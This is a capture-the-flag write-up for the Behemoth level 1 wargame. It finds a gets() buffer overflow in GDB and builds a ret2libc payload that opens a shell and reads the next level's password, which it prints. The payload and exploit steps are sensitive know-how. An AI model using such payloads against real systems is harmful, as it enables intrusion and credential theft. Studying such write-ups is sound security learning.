# behemoth1
slopey112 - 3/7/19

Let's take a look at this binary.
```
behemoth1@behemoth:/behemoth$ ./behemoth1
Password: asdf
Authentication failure.
Sorry.
```
Okay, so it's a password auth system. Let's open up GDB and see what we can do.
```assembly
0x0804844b <+0>:	push   ebp
0x0804844c <+1>:	mov    ebp,esp
0x0804844e <+3>:	sub    esp,0x44
0x08048451 <+6>:	push   0x8048500
0x08048456 <+11>:	call   0x8048300 <printf@plt>
0x0804845b <+16>:	add    esp,0x4
0x0804845e <+19>:	lea    eax,[ebp-0x43]
0x08048461 <+22>:	push   eax
0x08048462 <+23>:	call   0x8048310 <gets@plt>
0x08048467 <+28>:	add    esp,0x4
0x0804846a <+31>:	push   0x804850c
0x0804846f <+36>:	call   0x8048320 <puts@plt>
0x08048474 <+41>:	add    esp,0x4
0x08048477 <+44>:	mov    eax,0x0
0x0804847c <+49>:	leave  
0x0804847d <+50>:	ret
```
The main disassembly is very short and very understandable. We print the password prompt and we get the user input, and then print a message. Since there are no jump conditions, we can assume `puts` always prints "Sorry." regardless of the input.

But of course, there is our friend `gets`, calling for a buffer overflow vulnerability. Judging from the load instruction at `0x0804845e`, we can assume that is the size of the buffer. Let's quickly test our hypothesis to make sure.
```
(gdb) b *0x0804847c
Breakpoint 1 at 0x804847c
(gdb) r <<< $(python -c "print 'A'*67+'BBBB'")
Starting program: /behemoth/behemoth1 <<< $(python -c "print 'A'*67+'BBBB'")
Password: Authentication failure.
Sorry.

Breakpoint 1, 0x0804847c in main ()
(gdb) x/20wx $ebp
0xffffd6b8:	0x42424242	0xf7e2a200	0x00000001 0xffffd754
0xffffd6c8:	0xffffd75c	0x00000000	0x00000000 0x00000000
0xffffd6d8:	0xf7fc5000	0xf7ffdc0c	0xf7ffd000 0x00000000
0xffffd6e8:	0x00000001	0xf7fc5000	0x00000000 0x3f61125a
0xffffd6f8:	0x05881e4a	0x00000000	0x00000000 0x00000000
```
And sure enough, the first item on the stack right now is `BBBB`. If we continue, we'll get a segment fault; `ret` is the next instruction, which takes the first item on the stack and returns to that.
```
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xf7e2a202 in __libc_start_main () from /lib32/libc.so.6
(gdb) info registers $ebp
ebp            0x42424242	0x42424242
```
Sure enough, our hypothesis holds. We can use the elegant ret2libc attack as shown in [narnia2](/narnia/narnia2.md).
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
(gdb) find 0xf7e4c850, +99999999999, "/bin/sh"
0xf7f6ecc8
warning: Unable to access 16000 bytes of target memory at 0xf7fc8a50, halting search.
1 pattern found.
```
Now that we know where `system` and where `/bin/sh` is, we can construct our payload.
```
behemoth1@behemoth:/behemoth$ (python -c "print 'A'*67+'BBBB'+'\x50\xc8\xe4\xf7'+'BBBB'+'\xc8\xec\xf6\xf7'"; cat) | ./behemoth1
Password: Authentication failure.
Sorry.
whoami
behemoth2
cat /etc/behemoth_pass/behemoth2
eimahquuof
```
